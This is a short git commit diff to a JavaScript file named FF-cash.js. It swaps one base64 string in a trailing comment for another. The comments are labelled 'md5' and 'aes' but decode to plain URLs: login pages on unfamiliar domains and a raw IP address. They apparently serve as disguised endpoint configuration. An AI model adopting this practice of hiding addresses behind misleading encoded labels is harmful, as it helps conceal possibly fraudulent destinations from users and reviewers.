a045605e11a50a39185aabad2e89f624f8d4867f
unknown <caocaodajun@gmail.com>
2021-06-03 13:56:11 +0000

    init

--- js/FF-cash.js
+++ js/FF-cash.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cDovL20uY250dnVrLmNvbS9sb2dpbg==**//** aes:aHR0cDovLzQ3LjI0Mi4xOTkuMjE2**/
+})()/** md5:aHR0cHM6Ly9tLmhiZmxncnJ0b3Z2YzMyLnh5ei9sb2dpbg==**//** aes:aHR0cDovLzQ3LjI0Mi4xOTkuMjE2**/
